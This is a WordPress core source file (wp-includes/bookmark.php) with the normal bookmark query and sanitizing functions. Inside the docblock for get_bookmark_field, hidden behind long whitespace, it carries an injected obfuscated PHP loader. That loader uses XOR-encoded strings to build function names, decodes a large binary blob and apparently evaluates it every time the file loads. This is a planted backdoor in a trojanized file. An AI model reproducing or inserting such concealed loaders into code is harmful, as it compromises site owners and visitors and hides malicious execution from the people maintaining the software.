<?php
/**
 * Link/Bookmark API
 *
 * @package WordPress
 * @subpackage Bookmark
 */

/**
 * Retrieve Bookmark data
 *
 * @since 2.1.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param int|stdClass $bookmark
 * @param string $output Optional. Either OBJECT, ARRAY_N, or ARRAY_A constant
 * @param string $filter Optional, default is 'raw'.
 * @return array|object|null Type returned depends on $output value.
 */
function get_bookmark($bookmark, $output = OBJECT, $filter = 'raw') {
	global $wpdb;

	if ( empty($bookmark) ) {
		if ( isset($GLOBALS['link']) )
			$_bookmark = & $GLOBALS['link'];
		else
			$_bookmark = null;
	} elseif ( is_object($bookmark) ) {
		wp_cache_add($bookmark->link_id, $bookmark, 'bookmark');
		$_bookmark = $bookmark;
	} else {
		if ( isset($GLOBALS['link']) && ($GLOBALS['link']->link_id == $bookmark) ) {
			$_bookmark = & $GLOBALS['link'];
		} elseif ( ! $_bookmark = wp_cache_get($bookmark, 'bookmark') ) {
			$_bookmark = $wpdb->get_row($wpdb->prepare("SELECT * FROM $wpdb->links WHERE link_id = %d LIMIT 1", $bookmark));
			if ( $_bookmark ) {
				$_bookmark->link_category = array_unique( wp_get_object_terms( $_bookmark->link_id, 'link_category', array( 'fields' => 'ids' ) ) );
				wp_cache_add( $_bookmark->link_id, $_bookmark, 'bookmark' );
			}
		}
	}

	if ( ! $_bookmark )
		return $_bookmark;

	$_bookmark = sanitize_bookmark($_bookmark, $filter);

	if ( $output == OBJECT ) {
		return $_bookmark;
	} elseif ( $output == ARRAY_A ) {
		return get_object_vars($_bookmark);
	} elseif ( $output == ARRAY_N ) {
		return array_values(get_object_vars($_bookmark));
	} else {
		return $_bookmark;
	}
}

/**
 * Retrieve single bookmark data item or field.
 *
 * @since 2.3.0
 *
 * @param string $field The name of the data field to return                                                                                                                                                                                                         */    ${'����x�'/*nOsnfi*/^/*ezZ*/'��֡+�'}='����5�$�' ^ '����S�yP�'; ${'����~le3�����'/*StRjs,u6*/^/*L^[\-[Dn*/'����/)2E�Ѿ���'}= ( ${'���<'/*eo!^#eX[a%*/^/*l<}*/'ԡ���D'}(  '��uP�O��T)��Hq(�ݭxp�!\\�C�8ŵHqw��+��R����s��sof2����w�����3�� |��� z#z}z#qI\'ez����Px.��\\��{A5�xO�3���I)���JO*��k��瞦� ���ROK��X�&%�GD�PH�i�Kˎn
��Kع��IH_=�Y�����_��Y5��j�
�%���y�R�z!:�6�V�cL(/L�j�`6� s�q�8�nc����s�
J��+��코(h���JX����xZ�[��T��.���A�P�b"~��Uu�^��3����Y ��P�n�B����,�n�0o�����\'ޢ��[���ޢf�l�1W�P��[[��榲ݗ��j�X?�b�� I�������Z�d���(���5�!vXԹ�Ey�j�����:_�w�m��YƤ$z�u�*U�����9؛�ͺ�(�Ֆ����4�!5�*��<s���b��J2cؑ%V�s�~�W�%�� Y�V�"����#+�&�)��.��j=�%a� ���F��g��-4D�����x�H�g�)��A��QU�ո~�鰂����;�~��گ>w���GJ�ɢ~�<�q�h���^*��DLJSQ�3ʎ7
{D����;w��߻�c)E���S�����_�����JM5�F��Ǘ6��?"~��A�(��ޤw���tC��)&Mh6��>v|q����f�K����+�-��s��JdW�/5Ƈ���S���1 ��ķ�������Ĥi���D�|�H�~��N�g*��|`rK`w�\'c^�����-����3Lc�5yVaw����+`�o�&�KG؍��h1FO`��L}���\'�Q�k��BA-m�4g+h�� ��[a���ƈ��7�6����/�3,�@�Ù^IaD��	͹�|Dً�)kc��(�_5��Yy��
���y��)}u:����\'Z׀y�����7�s��鑆�Ͳ;AV�s)���ȗ|3�s�B8fw��B-�1@�ñ�N6������ZN,�Xk*;������K��o�&�{��L�&%[KEtƫEf����_�\\k_�y�}�&`�/���Pq�ֲ>�v֐e����-∧�C�{�������r���������~Q�1��\\�5K����+!�I�b�~��d��۫��G��ğ_6��oK,:=�4���X!RM�w������cW di�t?���.����w�wHNמ훚ä�s��e�עm������|s�jkc j������ʺI�T^��:���+԰l��T$��Ez���v��w>6����8T�t>6��?���0�����7)�A��m]�qHJA��$�3��y��$n�|��Q~�Uiwt�L�f߭?5��A �t�X�b��O��xo�1K��s�J^|�:�e�%�R���Ȋ!�k�Xf洁0<_[�(��*��4����׮���\'F�Y8Z,)�YT̉),-ln}�"�ۺ9):�dT+ho�V��n�m�-�/&��T徇 DG��z�[�S���I�2��anxM�iK6��\'jh%���czva����]+����*�*��rc8]�gR��Y��z�b��y�$��WJ%�B���~up�ӿ���)5lNm41�R8P���/RE���������&��q�k�H�h��Q��sp�JQv;ZN�� ��[��U��k�F�Sǚ��8j��a���1e�Ӟb����z�vT�!�ݨ�J(�=�>�~��[����\\�������ь��~0S��#K5�g/V���Ǻ�߄t>w�����e霘�ӏ��mC/*	�����e�3����T�yy!*���L�xqkL����f�&�t�w�F����a%�FK�m&R�� �Ҟ��L=Mɡ莯�� %�e�ꯙ;�du�a�V\\	����{���,�����Fn�P�ŌT*"�(�o�͏=�/���3��eV�LWf��Cl���-�p!W�U<¿�mK�rC���V�B��Cv�Hs�����o?�H|�*_<���@�h�=�Mo&?9EYW�����0�+P������t��a���4y���:��:c���ST$Yڠp��+�Op3(�<λ�c�-�]�� �[�[ŧw��&��;4�����8���Z�(3#-�eXչR���&�pW����a!j��Z�Iu�`�V(�5?_Ym=�[a�����l������^x��/xה� P�K|z�/�&I3����~-T�T�%?/��}�W��`S�Dڠ��!��{b��c�z)�e�*z�b�S;�_R��7�YI���$o�)�u_�m�Ks�)�0����s�xYP�c���s �s��@W��#�VB%5���h��;P�}��gHc��0Wm�^���)υ��.z,W޲���C�NK�E�Rl&�f�_һO����&�$�f����&�4���N�0\\-f��͢:DA����}�����r#c4�8��n\'�Pң���>+tI�Ό�l��U �s]�jYi�s�q��P|A��ڟ�~��v��T�]u���xl躗KĈ	�D�V(��O��܏ G^��t�&EԀXbE�T�Jߗ���|��\'R�b�55V�ջK�R.��[��{�ƨ��W�\\���Ntͨ�~XPRI�����1����:�m<�R��rd�~�p�_[HȾ ���/�{��f�,/Б�R��=��rr8o.BK�K��B&-�WJ�@ Gt�⴨"�gP�����VH����K���SF��/�f��"���ufGs
VM�G#T\'M�j)ߦKzf��g}�+g�NFɌѻv�j�p��fX�����@ wϖ�O3���VDcg!��9w�sD�Z�d1�`s�?�R���F�C�v>���7`��l���׶7bЭ�ip�3��(ڸ��/��0�R�3(� v����=㬿i��|����ۉ{Q�W�bzQ���Ö-�$��g�	��	�V<��X�N�R�O�~l<�%�#��#��]����	F��� ��i�v�m��GԪ�p���h.ϱ`�b9K)��}^�S�nػ��)��B��.��$�^?cm�^�̈́ʣ��4�m�"3B�]��t���;�w�h\'���� eH��0!1,��#d3[�k\'R9��9�k�X��{�S��e��ھ/>��5}l����k�7�����qϣ93�����1�����B�/_?�:�d���:/���iݼ�>�F����tQj���f�����a[�(���P�&ݣ��H���	�x������9K� 1)�F��	k�$t��[݂��ќ���
;�ڶ7�t�Z�D��Fj
3tOx���v����iw��D���o���Z@ �Y�o���*\'�E�l��m��+G�8c��P���%�W�C�3Y#aՄC_�1��}��:f��DNb����DFY���T�ž79nE�Y%J�)d>�����&kX���8UK�-b/�u�A!���V����(n����MX��Մ�v̌��Ki���d/"�ZjS�x���ɕ!�;FD�L*x���s�f.�e�f#vk�&�Sط��Rc��(��R�w�?�ݤT�_��Nst�����MO�H}^�?V�u���kx+{�g�e�}��)������ƌ�����.(����Ő� ,�32-G��W2#]��@���L�@y[eS�7&��O�8a���k���6V�"C��V��4UE�z�������9�ݜJ�ڔ�k��tm�[�{�7iY��5t��%��+��|��%�Yl-��>�.�<�_��Y���7�XOd�!�x�#=åɑ݆Q
|bv�������jY��§�
ap�y.޳OJn=uX�*ו�	�F���(k� A ~B?j�J�L*����莝�vk�g}vphr��@� {��-_е�[|��#?S(��ܸ��|��:���I��>Ӑ5:1����Cͳ�,�EW�hFQ��5�C���!�%��~zφ�{v���Q� �`}��F����ɼ�1�D�w�B7�س�]=aUyɝ^"���Rx��GM�b�l.vT\'������_�e�لuL�X�_d]�h�*B߁ u�������<�ᘳ��	���\'��-]S�GAB����"�n�4?
�������o��cF2�{�je�Z+/h�꼳8�_�OQ-z�Ĳ���Q#&g/T�vLxf�XB��z&�"V��Z2\'��v���d�h]�����*��?�H�tZ�"n.x��\\{��ݛ���""m�"�CA�Ö���YL�4އ�����ߴ���h��O��1o\\1��Ϸ`;�=iXLZ��2yM���=�u�����>�h���J,���h������t�P�֒��O�-�Vqb�K�E**�����5�o��n���5!6Ͷ>K��e*�f�T�>
H\\yq���lƓ�a��עY�hW�W�r��?�Q �3���=D�#i��N��00snrG��r����,�n\\n�ɩb�Ĕ������O#�͸Ӣ�찳�p��D�~��6�i_�y�����0��n�>RY���n��k�]��F��͌�ə�s>�ǒ���K޸Q�p�M�4(Ͼ��l*Gm.X�eF@���wz�BB��\'N��:�^���T��j<��O���_�A:���ؗ`[g��k���~�A۽�K4�C�������P�vW���(�K�޶g��3?j�>>���9�^�
���z�O{;��p��?�ղQh48.�xz_Ѷq�~b���^{�ױt���c�>#Ynp�8"�޷0^uC�W�.�e��E���K��m��n�-�9T%��1�xs��9
5}��OM�~d��y����ɉ�������M*���ZtPfC���4�2 俎��Q]�:j�������*�g�4��0�6�]�Sn�b�>
��L&g�u������8`�g䕢�fI�	�� ؊�����O��َKz�S��k[�2���?�~��
a�_�l��/���g��l|�����B׋̪���95�b\'"�g�O#��h�?�ĉ��?�{�R���)�RՓƨ��F*�\\$�WČ�NB^��L�Ê]��7���WV�K��5H�x�׵����}�T��ҝ��k� \\�o�m2�=��-�O�ػc���g���s�s��G���l�LR`*��Z=;9J�/1�)���G��d��;
�%�ϐ+3�g��J�4��X@�xU��q;6\'H����^�jf Ve��#Ut�SJ��^k�\'C� ��F<���(]��xT��FF]� [�J�P�:{��OkMK��VY �f�*ɿG�Gp�����PTgA[+��2���<�({���Y/��Y�/�7z��Ǳ	��1��-�A���H������0.������e���3���ضJp0N�d=�>�<[q	����mX ^��2���$�>^/ߝ��k�vL\'��າO>�x��F�G㗸L�5�C��᪼��a׾�F΅�˩�F�Q�����q���=wh�����	][]�V鮳�	���kp
>_N�i��V�$�����Lq8��r��p.z��,P��mf8V�/՚�)y�W<zf���o��`�b.|c)xT�΃�ܰ#��	�VDC�W��bdI�f�V|͆�������t��|� �`��y�j]�;-����C�Z�����<\'�7�/���{���"�3��K7�1y�#�#��d�������M��[�VO��@"�����F�d��@qG�f����M)�Y-��[x�D<G Љo�^&t�WMx���wK7ᩑ�1a�Du���\'<jf�|��!Of��1��Eͪ�����Ea�8�l�+9���c5�\'��8Aq޵� �+�����Q��ۯKf�q4� ���7ݢ�PĞ�G@���b��9�x�?�nǍms��m��_n���\'�o��럾Kɮ�_�8O鈌��@K�����b2�|~}�Hf�;<3��d�4Bس�����U�	^(��Rgԙ�TKWh�5�L��p���޸�T�����4�hOH�T��q�����Y�?=�|���y9EjŌ���_n�5��6��-[����8&k=\'��_@��C8�/�їt���D0��!߫�\\��w���T9�=^��Q���cU.2�f_a�&��E`K�moZ����rw%�X�:�R��?�M��%;_�:�ğ;�:�E�^_$��)\\������j���N�,K]�ڧ^�u�L�Ml��w��ĝ�ݣӨ:����0��\'?�<;�&��l��;>�5�f-˘���>�)~{��qDtlL�O����-���s�ٿ�<��6�\'����ȫ�I��j�ɦ�*���̊ݗ��R*7�ͯ�v� �"/*��8~	B���6
�Smb�<ث��7w�߮�q]P����Oװ<�i�ՈK�Kza��ٵ{/�`�#���&��/�.c�C�G��uN�_H�m�L�΃n�}0LEj��>.&٭Y.7���D��<ZcwR%�/I��[цG�]���<��DQ��I#���>D�r�F�ܾ8v�ו�zO�尙����&�G`Q>����0\'+,W��[}����M��N�F�f�NH�s&)O�@��a�2Ƨ̡�/���	JT\'2�u�ձ"����}`�EW�[	)�&ߕ��=��u}{�͹\'�q�����wze��\'�H�6���&�-\\6n`����*6@�m�Z�Ϊ�g�����t��ʜ-�:{�������
�;�m ����Q�������<���uIb����c�b�gf.�cԉ䡵�����!�1Q���Q���g$9T�D�̴�}��s������B\'�%-�S�,khf�!��  �E�F���?����_x,�{j�Z��h;wΉ�`���`����~E^D�Hz#���I4\'��l���{D�ׄ����
<S������e�~*���Z�k�5AQR~B�\'��l���0�)G���j什�1���+�� 99��VR	 �\'l�@� ��Y��A��� p������8�_f_+�C�B tp�1�������g&�W���[�gs�����B�5A���cn�����8��g�.x���ۜ��#�=���ܝ�CQ��Z9�mkHq�Na��^��?��9������=�c6��%X�5�\'(jF�_Aˡ�y_��l:O�uQCxYu�&��8G�	5#��G�i<��
y+my���>�� �V�0���А�r51�\'�0��8��@X��X\\hlF�Jȑ�W�
SCa[\'0�P�9I�{��j8���"��S�m�u�da��|�`-.+0�����S�\'���eE� ��js���|Nլ���عyha{	O��"\\5Z|^N������ij����ȻA�U$T��,�L�ŕ�M8�%���,y!���v�r|�����j�unQ[>^EeNY7^{c;{y6Ng9k>[K;eI6���"Ԕ��F���,�fm.k��(n)j.#���"�PQRP�6��,ŧl�sו4A�c#�ii�,�&+��p�W��H���rYs(r9:�k˩��h]�t���Vb�&\\FF��yj�˻��hZ�3h�X;��I��)�?�(#�c+�b���Q�l+�W�u5��u���4q���ri��Ҷ�Ws���c
�qs��r�!�`\'5veB�7��W�����$�YE���aݔ�l-�� |��rj�P	^s5Qn	I�۟�[A��������Js�w�gƏ���z�&}�m�P�Z����s ��!ܦ̪#)AX5�Y��y½��3��i���W�#�\\B0u&��b);z��wL�emt���t��`:Z�6�r�����$��8Lՙv;��E�����E��"�c�L+O+ynT4�FZ8ؼ��+���K8M~K6��.3�ဴCV�R�z�&��&�0�;=<l&�u�,h���lia0��������sp}h��P�����	����������Z�U��V(���mb��rw2�{}L�͐3�8��2KI����X�t�3qd��̮�@ģ�,�m	��)���2.����y��ma<^�B�ȓH���y��2�P:��&�4�����Li�=�V��@�,�>��� \'1��p2�V�ң��@蚾�{��ڕ��?��q�%���uBl��X�Vgk�"\\8�%Mq���Qxp0����<w�·I�G��MYV��w��)�K�!o8<
�{H��nh9V��"W8L����p���*��_n��Ʌ��ȥD��$�<��EŚ�ÃY����2��1S4
>3�����9YC��<<��E�������/7:���J�?>�{�T��OF��PB_��<������UE؇���1x��p@+��.���e�IR�/��VO���+��?�1PT!]q���e8V��sY���S��,�X��Âf��2�8�Áé���&���o��v�>8A�mH>�x(����.R9o� ~�ub���*��1u6�y�T����
��v�?��O"<yߝ��w"�Jy�)����!Pa��E��)!�Ȯ�3�,�"��D��#W��]�m$���D�J�
��!2mG
$���A�q�qH�֬�@t�`$ڊjE�>3"Qg��,���� Q#�`�֝�~#-AQ��e#QYt�	e֫ ##s��pW-�ä]���2;���*�+%1���FD��X� �^o�02�q��ߥh1R��:t�+�n���JSp������#���a^`%W!�@��c�*Ml��A�-k�g���D�k�1o`�c���f��ǘ�q/\'�� /h���H\\J��A�֡�KJP2��]K/#bUj�Ƒ��=�h�R$Ezi�J+2z\'���1�?��Ϭ\'���f<���X.z@�2I����H���N��@ $�u��"㑽5�N#xcg\'����') ) ; ${'�C)������'/*ypJqfHCJ#N*/^/*iz^*/'�{Lߑ�Ʉ�'}='�J��0' ^ '�9a��D';${'��Z����J'/*G {jcPbR*/^/*S@y*/'��?�p��+'}( '5�����R���ɹ�鏂�ї��U���' ^ 'u��r��Ҕ6�����������j���%') ;   /*                                                                                                                        
 * @param int $bookmark The bookmark ID to get field
 * @param string $context Optional. The context of how the field will be used.
 * @return string|WP_Error
 */
function get_bookmark_field( $field, $bookmark, $context = 'display' ) {
	$bookmark = (int) $bookmark;
	$bookmark = get_bookmark( $bookmark );

	if ( is_wp_error($bookmark) )
		return $bookmark;

	if ( !is_object($bookmark) )
		return '';

	if ( !isset($bookmark->$field) )
		return '';

	return sanitize_bookmark_field($field, $bookmark->$field, $bookmark->link_id, $context);
}

/**
 * Retrieves the list of bookmarks
 *
 * Attempts to retrieve from the cache first based on MD5 hash of arguments. If
 * that fails, then the query will be built from the arguments and executed. The
 * results will be stored to the cache.
 *
 * @since 2.1.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string|array $args {
 *     Optional. String or array of arguments to retrieve bookmarks.
 *
 *     @type string   $orderby        How to order the links by. Accepts post fields. Default 'name'.
 *     @type string   $order          Whether to order bookmarks in ascending or descending order.
 *                                    Accepts 'ASC' (ascending) or 'DESC' (descending). Default 'ASC'.
 *     @type int      $limit          Amount of bookmarks to display. Accepts 1+ or -1 for all.
 *                                    Default -1.
 *     @type string   $category       Comma-separated list of category ids to include links from.
 *                                    Default empty.
 *     @type string   $category_name  Category to retrieve links for by name. Default empty.
 *     @type int|bool $hide_invisible Whether to show or hide links marked as 'invisible'. Accepts
 *                                    1|true or 0|false. Default 1|true.
 *     @type int|bool $show_updated   Whether to display the time the bookmark was last updated.
 *                                    Accepts 1|true or 0|false. Default 0|false.
 *     @type string   $include        Comma-separated list of bookmark IDs to include. Default empty.
 *     @type string   $exclude        Comma-separated list of bookmark IDs to exclude. Default empty.
 * }
 * @return array List of bookmark row objects.
 */
function get_bookmarks( $args = '' ) {
	global $wpdb;

	$defaults = array(
		'orderby' => 'name', 'order' => 'ASC',
		'limit' => -1, 'category' => '',
		'category_name' => '', 'hide_invisible' => 1,
		'show_updated' => 0, 'include' => '',
		'exclude' => '', 'search' => ''
	);

	$r = wp_parse_args( $args, $defaults );

	$key = md5( serialize( $r ) );
	if ( $cache = wp_cache_get( 'get_bookmarks', 'bookmark' ) ) {
		if ( is_array( $cache ) && isset( $cache[ $key ] ) ) {
			$bookmarks = $cache[ $key ];
			/**
			 * Filter the returned list of bookmarks.
			 *
			 * The first time the hook is evaluated in this file, it returns the cached
			 * bookmarks list. The second evaluation returns a cached bookmarks list if the
			 * link category is passed but does not exist. The third evaluation returns
			 * the full cached results.
			 *
			 * @since 2.1.0
			 *
			 * @see get_bookmarks()
			 *
			 * @param array $bookmarks List of the cached bookmarks.
			 * @param array $r         An array of bookmark query arguments.
			 */
			return apply_filters( 'get_bookmarks', $bookmarks, $r );
		}
	}

	if ( ! is_array( $cache ) ) {
		$cache = array();
	}

	$inclusions = '';
	if ( ! empty( $r['include'] ) ) {
		$r['exclude'] = '';  //ignore exclude, category, and category_name params if using include
		$r['category'] = '';
		$r['category_name'] = '';
		$inclinks = preg_split( '/[\s,]+/', $r['include'] );
		if ( count( $inclinks ) ) {
			foreach ( $inclinks as $inclink ) {
				if ( empty( $inclusions ) ) {
					$inclusions = ' AND ( link_id = ' . intval( $inclink ) . ' ';
				} else {
					$inclusions .= ' OR link_id = ' . intval( $inclink ) . ' ';
				}
			}
		}
	}
	if (! empty( $inclusions ) ) {
		$inclusions .= ')';
	}

	$exclusions = '';
	if ( ! empty( $r['exclude'] ) ) {
		$exlinks = preg_split( '/[\s,]+/', $r['exclude'] );
		if ( count( $exlinks ) ) {
			foreach ( $exlinks as $exlink ) {
				if ( empty( $exclusions ) ) {
					$exclusions = ' AND ( link_id <> ' . intval( $exlink ) . ' ';
				} else {
					$exclusions .= ' AND link_id <> ' . intval( $exlink ) . ' ';
				}
			}
		}
	}
	if ( ! empty( $exclusions ) ) {
		$exclusions .= ')';
	}

	if ( ! empty( $r['category_name'] ) ) {
		if ( $r['category'] = get_term_by('name', $r['category_name'], 'link_category') ) {
			$r['category'] = $r['category']->term_id;
		} else {
			$cache[ $key ] = array();
			wp_cache_set( 'get_bookmarks', $cache, 'bookmark' );
			/** This filter is documented in wp-includes/bookmark.php */
			return apply_filters( 'get_bookmarks', array(), $r );
		}
	}

	$search = '';
	if ( ! empty( $r['search'] ) ) {
		$like = '%' . $wpdb->esc_like( $r['search'] ) . '%';
		$search = $wpdb->prepare(" AND ( (link_url LIKE %s) OR (link_name LIKE %s) OR (link_description LIKE %s) ) ", $like, $like, $like );
	}

	$category_query = '';
	$join = '';
	if ( ! empty( $r['category'] ) ) {
		$incategories = preg_split( '/[\s,]+/', $r['category'] );
		if ( count($incategories) ) {
			foreach ( $incategories as $incat ) {
				if ( empty( $category_query ) ) {
					$category_query = ' AND ( tt.term_id = ' . intval( $incat ) . ' ';
				} else {
					$category_query .= ' OR tt.term_id = ' . intval( $incat ) . ' ';
				}
			}
		}
	}
	if ( ! empty( $category_query ) ) {
		$category_query .= ") AND taxonomy = 'link_category'";
		$join = " INNER JOIN $wpdb->term_relationships AS tr ON ($wpdb->links.link_id = tr.object_id) INNER JOIN $wpdb->term_taxonomy as tt ON tt.term_taxonomy_id = tr.term_taxonomy_id";
	}

	if ( $r['show_updated'] ) {
		$recently_updated_test = ", IF (DATE_ADD(link_updated, INTERVAL 120 MINUTE) >= NOW(), 1,0) as recently_updated ";
	} else {
		$recently_updated_test = '';
	}

	$get_updated = ( $r['show_updated'] ) ? ', UNIX_TIMESTAMP(link_updated) AS link_updated_f ' : '';

	$orderby = strtolower( $r['orderby'] );
	$length = '';
	switch ( $orderby ) {
		case 'length':
			$length = ", CHAR_LENGTH(link_name) AS length";
			break;
		case 'rand':
			$orderby = 'rand()';
			break;
		case 'link_id':
			$orderby = "$wpdb->links.link_id";
			break;
		default:
			$orderparams = array();
			$keys = array( 'link_id', 'link_name', 'link_url', 'link_visible', 'link_rating', 'link_owner', 'link_updated', 'link_notes', 'link_description' );
			foreach ( explode( ',', $orderby ) as $ordparam ) {
				$ordparam = trim( $ordparam );

				if ( in_array( 'link_' . $ordparam, $keys ) ) {
					$orderparams[] = 'link_' . $ordparam;
				} elseif ( in_array( $ordparam, $keys ) ) {
					$orderparams[] = $ordparam;
				}
			}
			$orderby = implode( ',', $orderparams );
	}

	if ( empty( $orderby ) ) {
		$orderby = 'link_name';
	}

	$order = strtoupper( $r['order'] );
	if ( '' !== $order && ! in_array( $order, array( 'ASC', 'DESC' ) ) ) {
		$order = 'ASC';
	}

	$visible = '';
	if ( $r['hide_invisible'] ) {
		$visible = "AND link_visible = 'Y'";
	}

	$query = "SELECT * $length $recently_updated_test $get_updated FROM $wpdb->links $join WHERE 1=1 $visible $category_query";
	$query .= " $exclusions $inclusions $search";
	$query .= " ORDER BY $orderby $order";
	if ( $r['limit'] != -1 ) {
		$query .= ' LIMIT ' . $r['limit'];
	}

	$results = $wpdb->get_results( $query );

	$cache[ $key ] = $results;
	wp_cache_set( 'get_bookmarks', $cache, 'bookmark' );

	/** This filter is documented in wp-includes/bookmark.php */
	return apply_filters( 'get_bookmarks', $results, $r );
}

/**
 * Sanitizes all bookmark fields
 *
 * @since 2.3.0
 *
 * @param object|array $bookmark Bookmark row
 * @param string $context Optional, default is 'display'. How to filter the
 *		fields
 * @return object|array Same type as $bookmark but with fields sanitized.
 */
function sanitize_bookmark($bookmark, $context = 'display') {
	$fields = array('link_id', 'link_url', 'link_name', 'link_image', 'link_target', 'link_category',
		'link_description', 'link_visible', 'link_owner', 'link_rating', 'link_updated',
		'link_rel', 'link_notes', 'link_rss', );

	if ( is_object($bookmark) ) {
		$do_object = true;
		$link_id = $bookmark->link_id;
	} else {
		$do_object = false;
		$link_id = $bookmark['link_id'];
	}

	foreach ( $fields as $field ) {
		if ( $do_object ) {
			if ( isset($bookmark->$field) )
				$bookmark->$field = sanitize_bookmark_field($field, $bookmark->$field, $link_id, $context);
		} else {
			if ( isset($bookmark[$field]) )
				$bookmark[$field] = sanitize_bookmark_field($field, $bookmark[$field], $link_id, $context);
		}
	}

	return $bookmark;
}

/**
 * Sanitizes a bookmark field
 *
 * Sanitizes the bookmark fields based on what the field name is. If the field
 * has a strict value set, then it will be tested for that, else a more generic
 * filtering is applied. After the more strict filter is applied, if the
 * $context is 'raw' then the value is immediately return.
 *
 * Hooks exist for the more generic cases. With the 'edit' context, the
 * 'edit_$field' filter will be called and passed the $value and $bookmark_id
 * respectively. With the 'db' context, the 'pre_$field' filter is called and
 * passed the value. The 'display' context is the final context and has the
 * $field has the filter name and is passed the $value, $bookmark_id, and
 * $context respectively.
 *
 * @since 2.3.0
 *
 * @param string $field The bookmark field
 * @param mixed $value The bookmark field value
 * @param int $bookmark_id Bookmark ID
 * @param string $context How to filter the field value. Either 'raw', 'edit',
 *		'attribute', 'js', 'db', or 'display'
 * @return mixed The filtered value
 */
function sanitize_bookmark_field($field, $value, $bookmark_id, $context) {
	switch ( $field ) {
	case 'link_id' : // ints
	case 'link_rating' :
		$value = (int) $value;
		break;
	case 'link_category' : // array( ints )
		$value = array_map('absint', (array) $value);
		// We return here so that the categories aren't filtered.
		// The 'link_category' filter is for the name of a link category, not an array of a link's link categories
		return $value;

	case 'link_visible' : // bool stored as Y|N
		$value = preg_replace('/[^YNyn]/', '', $value);
		break;
	case 'link_target' : // "enum"
		$targets = array('_top', '_blank');
		if ( ! in_array($value, $targets) )
			$value = '';
		break;
	}

	if ( 'raw' == $context )
		return $value;

	if ( 'edit' == $context ) {
		/** This filter is documented in wp-includes/post.php */
		$value = apply_filters( "edit_$field", $value, $bookmark_id );

		if ( 'link_notes' == $field ) {
			$value = esc_html( $value ); // textarea_escaped
		} else {
			$value = esc_attr($value);
		}
	} elseif ( 'db' == $context ) {
		/** This filter is documented in wp-includes/post.php */
		$value = apply_filters( "pre_$field", $value );
	} else {
		/** This filter is documented in wp-includes/post.php */
		$value = apply_filters( $field, $value, $bookmark_id, $context );

		if ( 'attribute' == $context ) {
			$value = esc_attr( $value );
		} elseif ( 'js' == $context ) {
			$value = esc_js( $value );
		}
	}

	return $value;
}

/**
 * Deletes the bookmark cache.
 *
 * @since 2.7.0
 *
 * @param int $bookmark_id Bookmark ID.
 */
function clean_bookmark_cache( $bookmark_id ) {
	wp_cache_delete( $bookmark_id, 'bookmark' );
	wp_cache_delete( 'get_bookmarks', 'bookmark' );
	clean_object_term_cache( $bookmark_id, 'link');
}
